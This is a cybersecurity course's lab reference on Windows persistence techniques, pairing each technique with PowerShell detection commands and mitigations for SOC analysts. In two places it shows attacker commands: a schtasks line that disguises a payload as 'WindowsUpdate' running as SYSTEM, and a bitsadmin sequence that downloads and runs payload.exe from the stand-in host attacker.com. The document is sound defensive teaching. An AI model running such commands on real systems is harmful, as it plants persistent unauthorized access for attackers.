# Windows Persistence Techniques

> Lab reference — Holberton School | Cybersecurity Specialization

---

## What is Windows persistence?

Persistence is the ability of an attacker to maintain access to a compromised system across reboots, logouts, or other interruptions. Without persistence, access is lost the moment the session ends or the machine restarts.

In cybersecurity, understanding persistence is critical for both offense (red team) and defense (blue team / SOC). Every technique described below has a detection counterpart — knowing how attackers establish persistence is what allows analysts to detect and dismantle it.

---

## 1. Startup Folder

**How it works**

Windows automatically executes any file placed in the Startup folders at user login. There are two scopes:

| Scope | Path |
|---|---|
| Current user | `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| All users | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` |

Attackers place `.exe`, `.bat`, `.ps1`, `.vbs`, or `.lnk` files here. The file executes silently at every login.

**Detection**

```powershell
Get-ChildItem -Force -Recurse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem -Force -Recurse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

Look for files with recent or unexpected `LastWriteTime`, unusual names mimicking system processes (e.g. `vmtoolsd.bat`), and `.lnk` files pointing to non-standard paths.

---

## 2. Registry Keys (Run Keys)

**How it works**

Windows reads specific registry keys at startup and executes all values found there. These are the most commonly abused persistence locations.

| Scope | Key |
|---|---|
| Current user | `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` |
| All users | `HKLM:\Software\Microsoft\Windows\CurrentVersion\Run` |
| RunOnce (single execution) | `HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce` |

**Detection**

```powershell
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

Any value pointing to an unusual path (`C:\Temp\`, `C:\Users\Public\`, AppData) is suspicious.

---

## 3. Scheduled Tasks

**How it works**

The Windows Task Scheduler allows programs to run at defined triggers: at boot, at login, at a specific time, or on a system event. Attackers create tasks that blend in with legitimate system tasks.

```powershell
# Create a malicious scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\payload.exe" /sc onlogon /ru SYSTEM
```

**Detection**

```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft\*" }
```

Scrutinize tasks outside `\Microsoft\` paths, tasks running as SYSTEM with non-standard executables, and tasks with random or overly generic names.

---

## 4. DLL Hijacking

**How it works**

When Windows loads an application, it searches for required DLL files in a specific order (the DLL search order). If an attacker places a malicious DLL earlier in the search path than the legitimate one, Windows loads the malicious version instead.

Common vulnerable locations: application directory, `C:\Windows\`, `C:\Windows\System32\`.

**Risks**

- Runs with the same privileges as the hijacked application
- Difficult to detect as the process name appears legitimate
- Can persist across reboots if the application runs at startup

**Mitigation**

- Enable `SafeDllSearchMode` in the registry
- Use fully qualified paths in application manifests
- Apply `CWDIllegalInDllSearch` to restrict current-directory DLL loading
- Monitor DLL loads from non-standard paths with EDR/Sysmon (Event ID 7)

---

## 5. WMI (Windows Management Instrumentation)

**How it works**

WMI allows administrators to automate system management tasks. Attackers abuse it to create **event subscriptions** that execute code when a specific system event occurs (e.g. user login, process creation, time trigger).

A WMI persistence subscription consists of three components:

| Component | Role |
|---|---|
| Event Filter | Defines the trigger condition (e.g. "system startup") |
| Event Consumer | Defines what to execute (script or command) |
| Filter-to-Consumer Binding | Links the filter to the consumer |

**Why it's dangerous**: WMI persistence is **fileless** — it lives entirely in the WMI repository, not in the filesystem. Standard file-based detection tools miss it entirely.

**Detection**

```powershell
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

Any subscriptions outside expected administrative tools should be investigated immediately.

---

## 6. BITS Jobs (Background Intelligent Transfer Service)

**How it works**

BITS is a Windows service designed to transfer files in the background (used legitimately by Windows Update). Attackers abuse it to download malicious payloads because:

- BITS transfers survive reboots — the job resumes automatically
- Traffic blends in with legitimate Windows update traffic
- BITS jobs can execute a command upon transfer completion (`SetNotifyCmdLine`)
- Jobs persist in the BITS queue and are not visible in standard process listings

```powershell
# Attacker creates a persistent download job
bitsadmin /create /download MaliciousJob
bitsadmin /addfile MaliciousJob http://attacker.com/payload.exe C:\Temp\payload.exe
bitsadmin /SetNotifyCmdLine MaliciousJob C:\Temp\payload.exe NULL
bitsadmin /resume MaliciousJob
```

**Detection**

```powershell
Get-BitsTransfer -AllUsers
```

Look for jobs with external URLs, jobs pointing to `C:\Temp\`, `C:\Users\Public\`, or AppData, and jobs with a `SetNotifyCmdLine` pointing to non-standard executables.

---

## Summary table

| Technique | Scope | Fileless | Survives reboot | Detection difficulty |
|---|---|---|---|---|
| Startup folder | User / System | No | Yes | Low |
| Registry Run keys | User / System | No | Yes | Low |
| Scheduled tasks | User / System | No | Yes | Medium |
| DLL hijacking | Process | No | Yes | High |
| WMI subscriptions | System | Yes | Yes | High |
| BITS jobs | System | No | Yes | Medium |

---

## Key takeaway for SOC analysts

Every persistence technique has a **detection surface** — a place where it leaves a trace. Your job is to know where to look:

- Filesystem (Startup folders, Temp directories)
- Registry (Run keys, WMI repository)
- Scheduled tasks (Task Scheduler)
- Network (BITS outbound connections)
- Process/DLL loads (Sysmon Event ID 7, 11, 13)

Correlating these sources in your SIEM (e.g. SEKOIA) is what transforms raw events into actionable detections.

---

*Holberton School — Cybersecurity Specialization | Lab: Persistence Using Startup Folder*
